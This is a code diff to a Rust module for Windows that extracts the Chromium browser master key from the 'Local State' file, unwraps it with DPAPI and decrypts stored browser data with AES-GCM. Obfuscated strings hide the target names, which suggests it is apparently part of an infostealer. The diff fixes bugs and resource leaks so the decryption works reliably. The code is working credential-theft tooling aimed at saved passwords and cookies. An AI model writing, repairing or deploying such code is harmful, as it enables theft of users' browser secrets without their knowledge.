@@ -1,13 +1,15 @@
-use crate::base64::{base64_decode_string};
+use crate::base64::base64_decode_string;
 use crate::path::Path;
 use alloc::string::{String, ToString};
+use alloc::vec;
 use alloc::vec::Vec;
+use core::ffi::c_void;
 use core::mem::zeroed;
 use core::ptr::null_mut;
 use core::slice;
 use json::parse;
 use obfstr::obfstr as s;
-use windows_sys::Win32::Foundation::{LocalFree};
+use windows_sys::Win32::Foundation::LocalFree;
 use windows_sys::Win32::Security::Cryptography::{BCryptCloseAlgorithmProvider, BCryptDecrypt, BCryptDestroyKey, BCryptGenerateSymmetricKey, BCryptOpenAlgorithmProvider, BCryptSetProperty, CryptUnprotectData, BCRYPT_AES_ALGORITHM, BCRYPT_ALG_HANDLE, BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO, BCRYPT_CHAINING_MODE, BCRYPT_CHAIN_MODE_GCM, BCRYPT_KEY_HANDLE, CRYPT_INTEGER_BLOB};
 
 pub unsafe fn crypt_unprotect_data(data: &[u8]) -> Option<Vec<u8>> {
@@ -42,8 +44,9 @@ pub unsafe fn decrypt_data(buffer: &[u8], master_key: &[u8]) -> Option<String> {
         return None
     }
 
-    let mut iv = buffer[3..15].to_vec();
-    let mut ciphertext = buffer[15..buffer.len() - 16].to_vec();
+    let iv = &buffer[3..15];
+    let ciphertext = &buffer[15..buffer.len() - 16];
+    let tag = &buffer[buffer.len() - 16..];
 
     let mut alg: BCRYPT_ALG_HANDLE = null_mut();
     let mut key: BCRYPT_KEY_HANDLE = null_mut();
@@ -68,6 +71,7 @@ pub unsafe fn decrypt_data(buffer: &[u8], master_key: &[u8]) -> Option<String> {
     );
 
     if status != 0 {
+        BCryptCloseAlgorithmProvider(alg, 0);
         return None;
     }
 
@@ -82,29 +86,34 @@ pub unsafe fn decrypt_data(buffer: &[u8], master_key: &[u8]) -> Option<String> {
     );
 
     if status != 0 {
+        BCryptCloseAlgorithmProvider(alg, 0);
         return None
     }
     
-    let pb_tag = &buffer[buffer.len() - 16..];
-
-    let mut auth_into: BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO = zeroed();
-    auth_into.cbSize = size_of::<BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO>() as _;
-    auth_into.dwInfoVersion = 1;
-    auth_into.pbNonce = iv.as_mut_ptr();
-    auth_into.cbNonce = iv.len() as _;
-    auth_into.pbTag = pb_tag.as_ptr() as _;
-    auth_into.cbTag = 16;
+    let auth_info = BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO {
+        cbSize: size_of::<BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO>() as u32,
+        dwInfoVersion: 1,
+        pbNonce: iv.as_ptr() as *mut u8,
+        cbNonce: iv.len() as u32,
+        pbAuthData: null_mut(),
+        cbAuthData: 0,
+        pbTag: tag.as_ptr() as *mut u8,
+        cbTag: tag.len() as u32,
+        pbMacContext: null_mut(),
+        cbMacContext: 0,
+        cbAAD: 0,
+        cbData: 0,
+        dwFlags: 0,
+    };
     
-    let mut decrypted = Vec::with_capacity(ciphertext.len());
-    decrypted.set_len(ciphertext.len());
-    
+    let mut decrypted = vec![0u8; ciphertext.len()];
     let mut decrypted_size: u32 = 0;
 
     let status = BCryptDecrypt(
         key,
-        ciphertext.as_mut_ptr(),
+        ciphertext.as_ptr() as *const _,
         ciphertext.len() as _,
-        &auth_into as *const _ as *const _,
+        &auth_info as *const _ as *mut c_void,
         null_mut(),
         0,
         decrypted.as_mut_ptr(),
@@ -112,19 +121,20 @@ pub unsafe fn decrypt_data(buffer: &[u8], master_key: &[u8]) -> Option<String> {
         &mut decrypted_size,
         0
     );
-    
+
+    BCryptDestroyKey(key);
+    BCryptCloseAlgorithmProvider(alg, 0);
+
     if status != 0 {
         return None
     }
-    
-    BCryptDestroyKey(key);
-    BCryptCloseAlgorithmProvider(alg, 0);
-    
+
     Some(String::from_utf8_lossy(&decrypted[..decrypted_size as usize]).to_string())
 }
 
 unsafe fn utf16_bstrlen(s: *const u16) -> usize {
     let mut len = 0;
+    
     while *s.add(len) != 0 {
         len += 1;
     }
@@ -134,9 +144,13 @@ unsafe fn utf16_bstrlen(s: *const u16) -> usize {
 
 pub unsafe fn extract_master_key(user_data: &Path) -> Option<Vec<u8>> {
     let bytes = (user_data / s!("Local State")).read_file().ok()?;
-    let parsed = parse(&bytes).unwrap();
+    let parsed = parse(&bytes).ok()?;
 
-    let key_in_base64 = parsed.get(s!("os_crypt"))?.get(s!("encrypted_key"))?.as_string()?.clone();
+    let key_in_base64 = parsed.get(s!("os_crypt"))
+        ?.get(s!("encrypted_key"))
+        ?.as_string()
+        ?.clone();
+    
     let key = base64_decode_string(&key_in_base64)?;
     let sliced_key = &key[5..];
     
